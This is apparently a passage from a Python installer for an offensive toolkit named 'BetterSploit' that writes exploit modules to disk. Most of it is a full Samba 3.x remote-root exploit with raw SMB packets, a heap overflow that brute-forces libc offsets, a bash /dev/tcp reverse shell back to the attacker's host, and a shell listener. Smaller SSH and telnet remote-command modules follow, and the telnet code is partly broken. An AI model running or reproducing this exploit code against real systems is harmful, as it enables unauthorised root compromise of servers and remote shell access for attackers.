	"6400000018ff00000000050016000000" + \
	"000000009f0102000000000000000000" + \
	"00000000030000000100000040000000" + \
	"020000000306005c73616d7200"
]

pwnsauce = {
	'smb_bind': \
		"00000092ff534d422500000000000100" + \
		"00000000000000000000000001001d14" + \
		"6400000010000048000004e0ff000000" + \
		"0000000000000000004a0048004a0002" + \
		"002600babe4f005c504950455c000500" + \
		"0b03100000004800000001000000b810" + \
		"b8100000000001000000000001007857" + \
		"34123412cdabef000123456789ab0000" + \
		"0000045d888aeb1cc9119fe808002b10" + \
		"486002000000",

	'data_chunk': \
		"000010efff534d422f00000000180000" + \
		"00000000000000000000000001001d14" + \
		"640000000eff000000babe00000000ff" + \
		"0000000800b0100000b0103f00000000" + \
		"00b0100500000110000000b010000001" + \
		"0000009810000000000800",

	'final_chunk': \
		"000009a3ff534d422f00000000180000" + \
		"00000000000000000000000001001d14" + \
		"640000000eff000000babe00000000ff" + \
		"00000008006409000064093f00000000" + \
		"00640905000002100000006409000001" + \
		"0000004c09000000000800"
}


def exploit(host, port, cbhost, cbport, target):
	global sploitshake, pwnsauce

	chunk_size = 4248

	target_tcp = (host, port)

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(target_tcp)

	n = 0
	for pkt in sploitshake:
		s.send(unhexlify(pkt))
		pkt_res = s.recv(rs)
		n = n+1

	fid = hexlify(pkt_res[0x2a] + pkt_res[0x2b])

	s.send(unhexlify(pwnsauce['smb_bind'].replace("babe", fid)))
	pkt_res = s.recv(rs)

	buf = "X"*20  # policy handle
	level = 2 #LSA_POLICY_INFO_AUDIT_EVENTS
	buf+=struct.pack('<H',level) # level
	buf+=struct.pack('<H',level)# level2
	buf+=struct.pack('<L',1)#auditing_mode
	buf+=struct.pack('<L',1)#ptr
	buf+=struct.pack('<L',100000) # r->count
	buf+=struct.pack('<L',20) # array_size
	buf+=struct.pack('<L',0)
	buf+=struct.pack('<L',100)

	buf += ("A" * target['chunk_offset'])

	buf+=struct.pack("I", 0);
	buf+=struct.pack("I", target['system_libc_offset']);
	buf+=struct.pack("I", 0);
	buf+=struct.pack("I", target['system_libc_offset']);
	buf+=struct.pack("I", 0xe8150c70);
	buf+="AAAABBBB"

	cmd = ";;;;/bin/bash -c '/bin/bash 0</dev/tcp/"+cbhost+"/"+cbport+" 1>&0 2>&0' &\x00"

	tmp = cmd*(816/len(cmd))
	tmp += "\x00"*(816-len(tmp))

	buf+=tmp
	buf+="A"*(37192-target['chunk_offset'])
	buf+='z'*(100000 - (28000 + 10000))

	buf_chunks = [buf[x:x+chunk_size] for x in xrange(0, len(buf), chunk_size)]
	n=0

	for chunk in buf_chunks:
		if len(chunk) != chunk_size:
			#print "LAST CHUNK #%d" % n
			bb = unhexlify(pwnsauce['final_chunk'].replace("babe", fid)) + chunk
			s.send(bb)
		else:
			#print "CHUNK #%d" % n
			bb = unhexlify(pwnsauce['data_chunk'].replace("babe", fid)) + chunk
			s.send(bb)
			retbuf = s.recv(rs)
		n=n+1

	s.close()

class connectback_shell(SocketServer.BaseRequestHandler):
	def handle(self):
		global do_brute

		print "\n[!] connectback shell from %s" % self.client_address[0]
		do_brute = False

		s = self.request

		import termios, tty, select, os
		old_settings = termios.tcgetattr(0)
		try:
			tty.setcbreak(0)
			c = True
			while c:
				for i in select.select([0, s.fileno()], [], [], 0)[0]:
					c = os.read(i, 1024)
					if c:
						if i == 0:
							os.write(1, c)

						os.write(s.fileno() if i == 0 else 1, c)
		except KeyboardInterrupt: pass
		finally: termios.tcsetattr(0, termios.TCSADRAIN, old_settings)

		return


class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
	pass


if len(sys.argv) != 6:
	print "\n  {*} samba 3.x remote root by kd(eax)@ireleaseyourohdayfuckyou {*}\n"
	print "  usage: %s <targethost> <targetport> <myip> <myport> <target>\n" % (sys.argv[0])
	print "  targets:"
	i = 0
	for target in targets:
		print "    %02d) %s" % (i, target['name'])
		i = i+1

	print ""
	sys.exit(-1)


target = targets[int(sys.argv[5])]

server = ThreadedTCPServer((sys.argv[3], int(sys.argv[4])), connectback_shell)
server_thread = threading.Thread(target=server.serve_forever)
server_thread.daemon = True
server_thread.start()

while do_brute == True:
	sys.stdout.write("\r{+} TRYING EIP=\x1b[31m0x%08x\x1b[0m OFFSET=\x1b[32m0x%08x\x1b[0m" % (target['system_libc_offset'], target['chunk_offset']))
	sys.stdout.flush()
	exploit(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], target)

	if "finder" in target:
		target['chunk_offset'] += 4
	else:
		target['system_libc_offset'] += 0x1000


if "finder" in target:
	print \
		"{!} found \x1b[32mNEW\x1b[0m target: chunk_offset = ~%d, " \
		"system_libc_offset = 0x%03x" % \
		(target['chunk_offset'], target['system_libc_offset'] & 0xff000fff)

while 1:
	time.sleep(999)

server.shutdown()""")
        if FileExistsError:
            pass
        file.close()
    except FileExistsError:
        pass


def ssh_rce():
    try:
        file = open("BetterSploit/modules/pre_authenticated-ssh-rce.py", "w")
        file.write("""
import paramiko
from sys import argv
host = argv[1]
name = argv[2]
password = argv[3]
cmd = argv[4]
def pre_authenticated(address, user, passwd, command):
    try:
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(address, username=user, password=passwd)
        ssh.exec_command(command)
        ssh.close()
    except IOError:
        print(f"Could Not Connect To {user}@{address}")
        exit(0)
if __name__ == "__main__":
    pre_authenticated(address=host, user=name, passwd=password, command=cmd)
    
""")
        if FileExistsError:
            pass
        file.close()
    except FileExistsError:
        pass


def telnet_rce_exploit():
    try:
        file = open("BetterSploit/modules/telet_rce_exploit.py", "w")
        file.write("""
import sys
import getpass
import telnetlib


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


def _un_authenticated():
    try:
        cnc = input(f"{Colors.red}CNC Ip Address : ")
        port_number = int(input("Enter Port Number : "))
        command = input("Enter Command : ")
        username = input(f"Enter Username : {Colors.end}")
        password = getpass.getpass()

        host = f"http://{cnc}:{port_number}"
        tn = telnetlib.Telnet(host)

        tn.read_until("login: ")
        tn.write(username + "\n")
        if password:
            tn.read_until("Password: ")
            tn.write(password + "\n")
        tn.write(command)
        print(tn.read_all())
    except Exception as error:
        print(error)
        sys.exit(0)


    if __name__ == "__main__":
        try:
            _un_authenticated()
        except Exception as error:
            print(error)
            sys.exit(0)

def _pre_authenticated():
    try:
        cnc = input(f"{Colors.red}CNC Ip Address : ")
        port_number = int(input("Enter Telnet Port Number : "))
        command = input("Enter Command : ")
        username = input("Enter Username : ")
        password = input(f"Enter Password : {Colors.end}")

        host = f"http://{cnc}:{port_number}"
        tn = telnetlib.Telnet(host)

        tn.read_until("login: ")
        tn.write(username + "\n")
        if password:
            tn.read_until("Password: ")
            tn.write(password + "\n")
        tn.write(command)
        print(tn.read_all())
    except Exception as error:
        print(error)
        sys.exit(0)


    if __name__ == "__main__":
        try:
            _pre_authenticated()
        except Exception as error:
            print(error)
            sys.exit(0)

if __name__ == "__main__":
    un_or_pre = input(f"{Colors.red}Pre Authenticated or Un Authenticated : {Colors.end}")
    if un_or_pre == "Un Authenticated" or un_or_pre == "un authenticated" or un_or_pre == "un_authenticated":
        _un_authenticated()
    elif un_or_pre == "Pre Authenticated" or un_or_pre == "pre authenticated" or un_or_pre == "pre_authenticated":
        _pre_authenticated()
""")
        file.close()
        if FileExistsError:
            pass
    except FileExistsError:
        pass


if __name__ == '__main__':
    try:
        os.mkdir("BetterSploit")
        if FileExistsError:
            pass
    except FileExistsError:
        pass
    os.chdir("BetterSploit")
    if FileExistsError:
        pass
    try:
        os.mkdir("BetterSploit/modules")
    except FileExistsError:
        pass
    except FileNotFoundError:
        pass
    if FileExistsError:
        pass
    try:
        os.chdir("BetterSploit/modules")
    except FileNotFoundError:
        pass
    requirements()
    smtplib_starttls_stripping_mitm()
    telnet_rce_exploit()
    samba()

    rce_exploit()
    linux_exploit_suggester()
    all_scan()
    os.chdir("BetterSploit/modules/CVE-2020-1472")
    os.system("pip install -r requirements.txt; pip3 install -r requirements.txt")
    os.chdir("../")
    os.system("chmod +x search.sh")
    print("Done!!!...")
